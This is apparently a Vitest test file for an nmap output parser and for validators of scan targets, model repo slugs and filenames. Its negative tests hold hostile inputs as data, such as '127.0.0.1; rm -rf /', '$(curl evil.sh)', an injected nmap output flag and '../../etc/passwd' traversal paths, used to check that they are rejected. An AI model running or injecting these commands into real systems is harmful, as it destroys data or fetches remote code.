import { describe, it, expect } from "vitest";
import {
  parseNmapOutput,
  assertSafeTarget,
  assertSafeRepo,
  assertSafeFilename,
} from "./nmapParse";

const SAMPLE_NMAP = `Starting Nmap 7.94 ( https://nmap.org ) at 2026-08-13 10:00 UTC
Nmap scan report for scanme.example.org (45.33.32.156)
Host is up (0.11s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http    nginx 1.18.0
443/tcp  open     ssl     nginx 1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.0.0.5
Host is up (0.0012s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE  SERVICE VERSION
53/tcp   open   domain  dnsmasq 2.90
Service Info: OS: Linux
`;

describe("parseNmapOutput", () => {
  it("parses multiple hosts with ports, versions and OS", () => {
    const hosts = parseNmapOutput(SAMPLE_NMAP);
    expect(hosts).toHaveLength(2);

    const [first, second] = hosts;
    expect(first.hostname).toBe("scanme.example.org");
    expect(first.ip).toBe("45.33.32.156");
    expect(first.ports).toHaveLength(3);
    expect(first.ports[0]).toMatchObject({
      port: 22,
      protocol: "tcp",
      service: "ssh",
    });
    expect(first.ports[0].version).toContain("OpenSSH 8.9p1");
    expect(first.os).toBe("Linux");

    expect(second.ip).toBe("10.0.0.5");
    expect(second.ports[0].service).toBe("domain");
  });

  it("returns empty array for garbage input", () => {
    expect(parseNmapOutput("no scan data here")).toEqual([]);
    expect(parseNmapOutput("")).toEqual([]);
  });

  it("ignores closed/filtered ports", () => {
    const hosts = parseNmapOutput(
      "Nmap scan report for 10.0.0.9\n80/tcp closed http\n443/tcp filtered https",
    );
    expect(hosts[0].ports).toHaveLength(0);
  });

  it("falls back to hostname as IP when no IP given", () => {
    const hosts = parseNmapOutput("Nmap scan report for pure-hostname.local");
    expect(hosts[0].ip).toBe("pure-hostname.local");
  });
});

describe("assertSafeTarget", () => {
  it("accepts valid hostnames, IPs and CIDRs", () => {
    expect(assertSafeTarget("example.com")).toBe("example.com");
    expect(assertSafeTarget("192.168.1.1")).toBe("192.168.1.1");
    expect(assertSafeTarget("10.0.0.0/24")).toBe("10.0.0.0/24");
    expect(assertSafeTarget("2001:db8::1")).toBe("2001:db8::1");
    expect(assertSafeTarget("  scanme.org ")).toBe("scanme.org");
  });

  it("rejects shell metacharacters and traversal", () => {
    expect(() => assertSafeTarget("127.0.0.1; rm -rf /")).toThrow();
    expect(() => assertSafeTarget("$(curl evil.sh)")).toThrow();
    expect(() => assertSafeTarget("`id`")).toThrow();
    expect(() => assertSafeTarget("")).toThrow();
    expect(() => assertSafeTarget("a".repeat(300))).toThrow();
    expect(() => assertSafeTarget("example.com -oG /tmp/x")).toThrow();
  });
});

describe("assertSafeRepo", () => {
  it("accepts owner/name slugs", () => {
    expect(assertSafeRepo("openai/whisper-small")).toBe("openai/whisper-small");
    expect(assertSafeRepo("meta-llama/Llama-3.2-1B")).toBe(
      "meta-llama/Llama-3.2-1B",
    );
  });

  it("rejects injection attempts", () => {
    expect(() => assertSafeRepo("openai/whisper; rm -rf")).toThrow();
    expect(() => assertSafeRepo("../etc/passwd")).toThrow();
    expect(() => assertSafeRepo("nope")).toThrow();
  });
});

describe("assertSafeFilename", () => {
  it("accepts plain model files", () => {
    expect(assertSafeFilename("model.safetensors")).toBe("model.safetensors");
    expect(assertSafeFilename("config.json")).toBe("config.json");
  });

  it("rejects path traversal and absolute paths", () => {
    expect(() => assertSafeFilename("../../etc/passwd")).toThrow();
    expect(() => assertSafeFilename("/etc/passwd")).toThrow();
    expect(() => assertSafeFilename("..\\..\\win.ini")).toThrow();
    expect(() => assertSafeFilename(".hidden")).toThrow();
    expect(() => assertSafeFilename("a\0b")).toThrow();
    expect(() => assertSafeFilename("dir/file.bin")).toThrow();
  });
});
